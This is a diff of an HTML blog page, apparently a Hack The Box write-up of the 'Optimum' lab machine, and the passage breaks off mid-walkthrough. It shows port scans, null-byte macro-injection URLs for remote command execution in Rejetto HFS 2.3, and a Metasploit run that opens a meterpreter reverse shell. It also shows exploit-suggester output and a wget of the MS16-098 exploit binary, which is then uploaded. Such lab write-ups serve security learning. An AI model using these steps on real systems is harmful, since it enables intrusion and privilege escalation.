@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -311,58 +311,62 @@ if (language) {
 
 <p>We scan the full range of TCP ports using masscan (Why masscan? Because it&rsquo;s faster than nmap)</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.8
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-10-10 09:58:16 GMT
-
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65536 ports/host]
-Discovered open port 80/tcp on 10.10.10.8</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.8
+<span class="err">
+</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-10-10 09:58:16 GMT
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class="go">Initiating SYN Stealth Scan
+</span><span class="go">Scanning 1 hosts [65536 ports/host]
+</span><span class="go">Discovered open port 80/tcp on 10.10.10.8
+</span></code></pre></div></div>
 
 <p>We found TCP port 80 open. Let&rsquo;s explore it using nmap:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A -p80 10.10.10.8
-
-Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-10 13:10 EEST
-Nmap scan report for 10.10.10.8
-Host is up (0.086s latency).
-
-PORT   STATE SERVICE VERSION
-80/tcp open  http    HttpFileServer httpd 2.3
-|_http-server-header: HFS 2.3
-|_http-title: HFS /
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running (JUST GUESSING): Microsoft Windows 2012 (89%)
-OS CPE: cpe:/o:microsoft:windows_server_2012
-Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p80 10.10.10.8
+<span class="err">
+</span><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-10 13:10 EEST
+</span><span class="go">Nmap scan report for 10.10.10.8
+</span><span class="go">Host is up (0.086s latency).
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">PORT   STATE SERVICE VERSION
+</span><span class="go">80/tcp open  http    HttpFileServer httpd 2.3
+</span><span class="go">|_http-server-header: HFS 2.3
+</span><span class="go">|_http-title: HFS /
+</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class="go">Device type: general purpose
+</span><span class="go">Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+</span><span class="go">OS CPE: cpe:/o:microsoft:windows_server_2012
+</span><span class="go">Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
+</span><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span><span class="go">Network Distance: 2 hops
+</span><span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></code></pre></div></div></p>
 
 <p>We scan only the 1000 most common UDP ports using nmap because UDP scanning it&rsquo;s very slow.
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -sU --top-ports 1000 10.10.10.8
-
-Nmap scan report for 10.10.10.8
-Host is up (0.075s latency).
-All 1000 scanned ports on 10.10.10.8 are open|filtered</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -sU --top-ports <span class="m">1000</span> 10.10.10.8
+<span class="err">
+</span><span class="err"></span><span class="go">Nmap scan report for 10.10.10.8
+</span><span class="go">Host is up (0.075s latency).
+</span><span class="go">All 1000 scanned ports on 10.10.10.8 are open|filtered
+</span></code></pre></div></div></p>
 
 <h1 id="exploitation">Exploitation</h1>
 
 <p>So, we have found that Rejetto HttpFileServer 2.3 is running on TCP port 80. Let&rsquo;s see if there are some exploits for it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ searchsploit rejetto 2.3 -w
--------------------------------------------------------------------------
- Exploit Title                                                         
--------------------------------------------------------------------------
- Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload
-    https://www.exploit-db.com/exploits/30850/
- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)
-    https://www.exploit-db.com/exploits/34668/
- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
-    https://www.exploit-db.com/exploits/39161/
- Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution
-    https://www.exploit-db.com/exploits/34852/
--------------------------------------------------------------------------</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>searchsploit rejetto 2.3 -w
+<span class="go">-------------------------------------------------------------------------
+</span><span class="go"> Exploit Title                                                         
+</span><span class="go">-------------------------------------------------------------------------
+</span><span class="go"> Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload
+</span><span class="go">    https://www.exploit-db.com/exploits/30850/
+</span><span class="go"> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)
+</span><span class="go">    https://www.exploit-db.com/exploits/34668/
+</span><span class="go"> Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
+</span><span class="go">    https://www.exploit-db.com/exploits/39161/
+</span><span class="go"> Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution
+</span><span class="go">    https://www.exploit-db.com/exploits/34852/
+</span><span class="go">-------------------------------------------------------------------------
+</span></code></pre></div></div></p>
 
 <p>Nice! There are some RCE exploits! :D</p>
 
@@ -372,229 +376,239 @@ All 1000 scanned ports on 10.10.10.8 are open|filtered</code></pre></div></p>
 begin result:=reMatch(s, &lsquo;{[.:]|[.:]}||&lsquo;, &rsquo;m!&rsquo;, ofs) end;</p>
 
 <p>It will not handle null byte:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">http://localhost:80/?search=%00{.exec|cmd.}</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">http://localhost:80/?search=%00{.exec|cmd.}
+</span></code></pre></div></div></p>
 
 <p>So the above request will stop regex from parsing macro, macro will be executed and remote code injection will happen. The exploit basically allow you to run commands like this:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">http://10.10.10.8/?search=%00{.exec|C:\windows\system32\cmd.exe /c echo hello &gt; test.}</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">http://10.10.10.8/?search=%00{.exec|C:\windows\system32\cmd.exe /c echo hello &gt; test.}
+</span></code></pre></div></div></p>
 
 <p>You can also upload/save a file like that:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">http://10.10.10.8/?search=%00{.save|fullpath\filename|data.}</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">http://10.10.10.8/?search=%00{.save|fullpath\filename|data.}
+</span></code></pre></div></div></p>
 
 <h2 id="using-metasploit">Using Metasploit</h2>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ msfconsole
-msf &gt; search name:rejetto
-
-Matching Modules
-================
-
-   Name                                   Disclosure Date  Rank       Description
-   ----                                   ---------------  ----       -----------
-   exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution
-
-msf &gt; use exploit/windows/http/rejetto_hfs_exec 
-msf exploit(rejetto_hfs_exec) &gt; set RHOST 10.10.10.8
-msf exploit(rejetto_hfs_exec) &gt; set RPORT 80 
-msf exploit(rejetto_hfs_exec) &gt; set SRVHOST 10.10.15.150
-msf exploit(rejetto_hfs_exec) &gt; set SRVPORT 60000  
-msf exploit(rejetto_hfs_exec) &gt; info
-
-  Name       Current Setting  Required  Description
-  ----       ---------------  --------  -----------
-  HTTPDELAY  20               no        Seconds to wait before terminating web server
-  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-  RHOST      10.10.10.8       yes       The target address
-  RPORT      80               yes       The target port (TCP)
-  SRVHOST    10.10.15.150     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-  SRVPORT    60000            yes       The local port to listen on.
-  SSL        false            no        Negotiate SSL/TLS for outgoing connections
-  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-  TARGETURI  /                yes       The path of the web application
-  URIPATH                     no        The URI to use for this exploit (default is random)
-  VHOST                       no        HTTP server virtual host
-
-
-msf exploit(rejetto_hfs_exec) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpset
-msf exploit(rejetto_hfs_exec) &gt; set LHOST 10.10.15.150
-msf exploit(rejetto_hfs_exec) &gt; set LPORT 60001
-msf exploit(rejetto_hfs_exec) &gt; exploit
-
-[*] Started reverse TCP handler on 10.10.15.150:60001 
-[*] Using URL: http://10.10.15.150:60000/uT3OPJWDAW7b3s
-[*] Server started.
-[*] Sending a malicious request to /
-[*] Payload request received: /uT3OPJWDAW7b3s
-[*] Sending stage (205379 bytes) to 10.10.10.8
-[*] Meterpreter session 1 opened (10.10.15.150:60001 -&gt; 10.10.10.8:49264) at 2017-10-10 13:44:11 +0300
-[!] Tried to delete %TEMP%\IJOurNACYIxzs.vbs, unknown result
-[*] Server stopped.</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>msfconsole
+<span class="go">msf &gt; search name:rejetto
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Matching Modules
+</span><span class="go">================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">   Name                                   Disclosure Date  Rank       Description
+</span><span class="go">   ----                                   ---------------  ----       -----------
+</span><span class="go">   exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">msf &gt; use exploit/windows/http/rejetto_hfs_exec 
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set RHOST 10.10.10.8
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set RPORT 80 
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set SRVHOST 10.10.15.150
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set SRVPORT 60000  
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; info
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">  Name       Current Setting  Required  Description
+</span><span class="go">  ----       ---------------  --------  -----------
+</span><span class="go">  HTTPDELAY  20               no        Seconds to wait before terminating web server
+</span><span class="go">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+</span><span class="go">  RHOST      10.10.10.8       yes       The target address
+</span><span class="go">  RPORT      80               yes       The target port (TCP)
+</span><span class="go">  SRVHOST    10.10.15.150     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+</span><span class="go">  SRVPORT    60000            yes       The local port to listen on.
+</span><span class="go">  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+</span><span class="go">  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+</span><span class="go">  TARGETURI  /                yes       The path of the web application
+</span><span class="go">  URIPATH                     no        The URI to use for this exploit (default is random)
+</span><span class="go">  VHOST                       no        HTTP server virtual host
+</span><span class="go"></span><span class="err">
+</span><span class="err">
+</span><span class="err"></span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpset
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set LHOST 10.10.15.150
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; set LPORT 60001
+</span><span class="go">msf exploit(rejetto_hfs_exec) &gt; exploit
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Started reverse TCP handler on 10.10.15.150:60001 
+</span><span class="go">[*] Using URL: http://10.10.15.150:60000/uT3OPJWDAW7b3s
+</span><span class="go">[*] Server started.
+</span><span class="go">[*] Sending a malicious request to /
+</span><span class="go">[*] Payload request received: /uT3OPJWDAW7b3s
+</span><span class="go">[*] Sending stage (205379 bytes) to 10.10.10.8
+</span><span class="go">[*] Meterpreter session 1 opened (10.10.15.150:60001 -&gt; 10.10.10.8:49264) at 2017-10-10 13:44:11 +0300
+</span><span class="go">[!] Tried to delete %TEMP%\IJOurNACYIxzs.vbs, unknown result
+</span><span class="go">[*] Server stopped.
+</span></code></pre></div></div>
 
 <p>Now we&rsquo;ve got a low privilege shelll as user Kostas:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">C:\Users\kostas\Desktop&gt; whoami
-OPTIMUM\kostas
-
-meterpreter &gt; sysinfo
-Computer        : OPTIMUM
-OS              : Windows 2012 R2 (Build 9600).
-Architecture    : x64
-System Language : el_GR
-Domain          : HTB
-Logged On Users : 97
-Meterpreter     : x64/windows
-Privilege Escalation</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">C:\Users\kostas\Desktop&gt; whoami
+</span><span class="go">OPTIMUM\kostas
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">meterpreter &gt; sysinfo
+</span><span class="go">Computer        : OPTIMUM
+</span><span class="go">OS              : Windows 2012 R2 (Build 9600).
+</span><span class="go">Architecture    : x64
+</span><span class="go">System Language : el_GR
+</span><span class="go">Domain          : HTB
+</span><span class="go">Logged On Users : 97
+</span><span class="go">Meterpreter     : x64/windows
+</span><span class="go">Privilege Escalation
+</span></code></pre></div></div></p>
 
 <p>Let&rsquo;s search for privilege escalation exploits:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
-$ cd Windows-Exploit-Suggester/
-$ python2 windows-exploit-suggester.py --update</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
+<span class="gp">$ </span><span class="nb">cd</span> Windows-Exploit-Suggester/
+<span class="gp">$ </span>python2 windows-exploit-suggester.py --update
+</code></pre></div></div></p>
 
 <p>We feed in windows-exploit-suggester.py an input file that contains the output from the &lsquo;systeminfo&rsquo; command:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">meterpreter &gt; execute -f &#34;cmd.exe /c systeminfo &gt; systeminfo.txt&#34;</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">meterpreter &gt; execute -f &#34;cmd.exe /c systeminfo &gt; systeminfo.txt&#34;
+</span></code></pre></div></div></p>
 
 <p>Yes I know that &lsquo;execute&rsquo; has a separate parameter -a to pass the arguments :P. But it also works like that and this scheme is actually clearer. You can also run &lsquo;shell&rsquo; and execute &lsquo;systeminfo &gt; systeminfo.txt&rsquo;. It&rsquo;s the same thing.</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">meterpreter &gt; download systeminfo.txt
-
-$ cat systeminfo.txt
-Host Name:                 OPTIMUM
-OS Name:                   Microsoft Windows Server 2012 R2 Standard
-OS Version:                6.3.9600 N/A Build 9600
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Standalone Server
-OS Build Type:             Multiprocessor Free
-Registered Owner:          Windows User
-Registered Organization:   
-Product ID:                00252-70000-00000-AA535
-Original Install Date:     18/3/2017, 1:51:36 ££
-System Boot Time:          16/10/2017, 9:20:08 ££
-System Manufacturer:       VMware, Inc.
-System Model:              VMware Virtual Platform
-System Type:               x64-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             el;Greek
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC+02:00) Athens, Bucharest
-Total Physical Memory:     4.095 MB
-Available Physical Memory: 2.556 MB
-Virtual Memory: Max Size:  5.503 MB
-Virtual Memory: Available: 3.303 MB
-Virtual Memory: In Use:    2.200 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    HTB
-Logon Server:              \\OPTIMUM
-Hotfix(s):                 31 Hotfix(s) Installed.
-                           [01]: KB2959936
-                           [02]: KB2896496
-                           [03]: KB2919355
-                           [04]: KB2920189
-                           [05]: KB2928120
-                           [06]: KB2931358
-                           [07]: KB2931366
-                           [08]: KB2933826
-                           [09]: KB2938772
-                           [10]: KB2949621
-                           [11]: KB2954879
-                           [12]: KB2958262
-                           [13]: KB2958263
-                           [14]: KB2961072
-                           [15]: KB2965500
-                           [16]: KB2966407
-                           [17]: KB2967917
-                           [18]: KB2971203
-                           [19]: KB2971850
-                           [20]: KB2973351
-                           [21]: KB2973448
-                           [22]: KB2975061
-                           [23]: KB2976627
-                           [24]: KB2977629
-                           [25]: KB2981580
-                           [26]: KB2987107
-                           [27]: KB2989647
-                           [28]: KB2998527
-                           [29]: KB3000850
-                           [30]: KB3003057
-                           [31]: KB3014442
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: Intel(R) 82574L Gigabit Network Connection
-                                 Connection Name: Ethernet0
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.8
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">meterpreter &gt; download systeminfo.txt
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="gp">$ </span>cat systeminfo.txt
+<span class="go">Host Name:                 OPTIMUM
+</span><span class="go">OS Name:                   Microsoft Windows Server 2012 R2 Standard
+</span><span class="go">OS Version:                6.3.9600 N/A Build 9600
+</span><span class="go">OS Manufacturer:           Microsoft Corporation
+</span><span class="go">OS Configuration:          Standalone Server
+</span><span class="go">OS Build Type:             Multiprocessor Free
+</span><span class="go">Registered Owner:          Windows User
+</span><span class="go">Registered Organization:   
+</span><span class="go">Product ID:                00252-70000-00000-AA535
+</span><span class="go">Original Install Date:     18/3/2017, 1:51:36 ££
+</span><span class="go">System Boot Time:          16/10/2017, 9:20:08 ££
+</span><span class="go">System Manufacturer:       VMware, Inc.
+</span><span class="go">System Model:              VMware Virtual Platform
+</span><span class="go">System Type:               x64-based PC
+</span><span class="go">Processor(s):              1 Processor(s) Installed.
+</span><span class="go">                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
+</span><span class="go">BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
+</span><span class="go">Windows Directory:         C:\Windows
+</span><span class="go">System Directory:          C:\Windows\system32
+</span><span class="go">Boot Device:               \Device\HarddiskVolume1
+</span><span class="go">System Locale:             el;Greek
+</span><span class="go">Input Locale:              en-us;English (United States)
+</span><span class="go">Time Zone:                 (UTC+02:00) Athens, Bucharest
+</span><span class="go">Total Physical Memory:     4.095 MB
+</span><span class="go">Available Physical Memory: 2.556 MB
+</span><span class="go">Virtual Memory: Max Size:  5.503 MB
+</span><span class="go">Virtual Memory: Available: 3.303 MB
+</span><span class="go">Virtual Memory: In Use:    2.200 MB
+</span><span class="go">Page File Location(s):     C:\pagefile.sys
+</span><span class="go">Domain:                    HTB
+</span><span class="go">Logon Server:              \\OPTIMUM
+</span><span class="go">Hotfix(s):                 31 Hotfix(s) Installed.
+</span><span class="go">                           [01]: KB2959936
+</span><span class="go">                           [02]: KB2896496
+</span><span class="go">                           [03]: KB2919355
+</span><span class="go">                           [04]: KB2920189
+</span><span class="go">                           [05]: KB2928120
+</span><span class="go">                           [06]: KB2931358
+</span><span class="go">                           [07]: KB2931366
+</span><span class="go">                           [08]: KB2933826
+</span><span class="go">                           [09]: KB2938772
+</span><span class="go">                           [10]: KB2949621
+</span><span class="go">                           [11]: KB2954879
+</span><span class="go">                           [12]: KB2958262
+</span><span class="go">                           [13]: KB2958263
+</span><span class="go">                           [14]: KB2961072
+</span><span class="go">                           [15]: KB2965500
+</span><span class="go">                           [16]: KB2966407
+</span><span class="go">                           [17]: KB2967917
+</span><span class="go">                           [18]: KB2971203
+</span><span class="go">                           [19]: KB2971850
+</span><span class="go">                           [20]: KB2973351
+</span><span class="go">                           [21]: KB2973448
+</span><span class="go">                           [22]: KB2975061
+</span><span class="go">                           [23]: KB2976627
+</span><span class="go">                           [24]: KB2977629
+</span><span class="go">                           [25]: KB2981580
+</span><span class="go">                           [26]: KB2987107
+</span><span class="go">                           [27]: KB2989647
+</span><span class="go">                           [28]: KB2998527
+</span><span class="go">                           [29]: KB3000850
+</span><span class="go">                           [30]: KB3003057
+</span><span class="go">                           [31]: KB3014442
+</span><span class="go">Network Card(s):           1 NIC(s) Installed.
+</span><span class="go">                           [01]: Intel(R) 82574L Gigabit Network Connection
+</span><span class="go">                                 Connection Name: Ethernet0
+</span><span class="go">                                 DHCP Enabled:    No
+</span><span class="go">                                 IP address(es)
+</span><span class="go">                                 [01]: 10.10.10.8
+</span><span class="go">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</span></code></pre></div></div>
 
 <p>I use the &ndash;quiet option to get more compact results. If you want to get more info like links for the exploits remove it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt --quiet
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (ISO-8859-2)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 246 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as &#39;Windows 2012 R2 64-bit&#39;
-[*] 
-[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
-[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
-[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
-[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
-[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
-[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
-[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
-[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
-[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
-[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
-[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
-[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
-[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
-[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
-[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
-[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
-[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
-[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
-[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
-[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
-[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
-[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
-[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
-[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
-[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
-[*] done</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt --quiet
+<span class="go">[*] initiating winsploit version 3.3...
+</span><span class="go">[*] database file detected as xls or xlsx based on extension
+</span><span class="go">[*] attempting to read from the systeminfo input file
+</span><span class="go">[+] systeminfo input file read successfully (ISO-8859-2)
+</span><span class="go">[*] querying database file for potential vulnerabilities
+</span><span class="go">[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+</span><span class="go">[*] there are now 246 remaining vulns
+</span><span class="go">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+</span><span class="go">[+] windows version identified as &#39;Windows 2012 R2 64-bit&#39;
+</span><span class="go">[*] 
+</span><span class="go">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+</span><span class="go">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+</span><span class="go">[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+</span><span class="go">[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+</span><span class="go">[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+</span><span class="go">[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+</span><span class="go">[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+</span><span class="go">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+</span><span class="go">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+</span><span class="go">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+</span><span class="go">[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+</span><span class="go">[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+</span><span class="go">[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+</span><span class="go">[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+</span><span class="go">[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+</span><span class="go">[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
+</span><span class="go">[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+</span><span class="go">[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+</span><span class="go">[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
+</span><span class="go">[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+</span><span class="go">[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+</span><span class="go">[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+</span><span class="go">[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+</span><span class="go">[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+</span><span class="go">[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+</span><span class="go">[*] done
+</span></code></pre></div></div></p>
 
 <p>Quite a few exploits. I tried some and I know that the 2nd one (MS16-098) works. The 6th one (MS16-032) works too but it&rsquo;s a pain in the ass if you don&rsquo;t set the correct architecture from start to end. Even if you have the correct architecture -in some metasploit configurations- this exploit doesn&rsquo;t work correctly.</p>
 
 <p>We download the -less troublesome, more reliable- exploit &ldquo;Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)&rdquo; from here: <a href="https://www.exploit-db.com/exploits/41020/" target="_blank">https://www.exploit-db.com/exploits/41020/</a></p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/41020.exe
-meterpreter &gt; upload 41020.exe
-meterpreter &gt; shell
